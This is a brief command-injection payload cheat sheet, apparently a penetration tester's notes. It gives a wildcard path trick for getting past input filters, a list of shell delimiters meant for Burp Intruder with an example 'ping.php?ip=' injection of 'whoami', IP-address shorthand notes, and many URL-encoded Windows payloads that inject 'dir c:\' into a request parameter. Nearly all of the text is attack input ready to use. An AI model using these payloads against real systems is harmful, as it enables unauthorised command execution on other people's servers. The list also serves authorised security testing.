Attempt to bypass sanitization??
-----------------
```
/usr/bin/whoami
/u??/b??/wh?am?
```

Delimiters
------------------
```bash
# Use in Burp Intuder
# eg...
# ping.php?ip=127.0.0.1%20<delimiter>%20whoami
&
&&
|
||
%0a
;
^
%0D
%0A
\n
<
#
```
Interesting stuff
-----------------
```
# https://ma.ttias.be/theres-more-than-one-way-to-write-an-ip-address/
# https://github.com/sii/sipcalc
# linux only
ping 0
# Zeros are optional
ping 127.1
```
Windows
----------------------
```
+|+Dir+c:\
$+|+Dir+c:\
%26%26+|+dir c:\
$%26%26dir c:\
%0a+dir+c:\
+|+Dir+c:%255c
$+|+Dir+c:%255c
%26%26+|+dir c:%255c
$%26%26dir+c:%255c
%0a+dir+c:%255c
+|+Dir+c:%2f
$+|+Dir+c:%2f
%26%26+|+dir c:%2f
$%26%26dir+c:%2f
%0a+dir+c:%2f
+dir+c:\+|
+|+dir+c:\+|
+|+dir+c:%2f+|
dir+c:\
||+dir|c:\
```

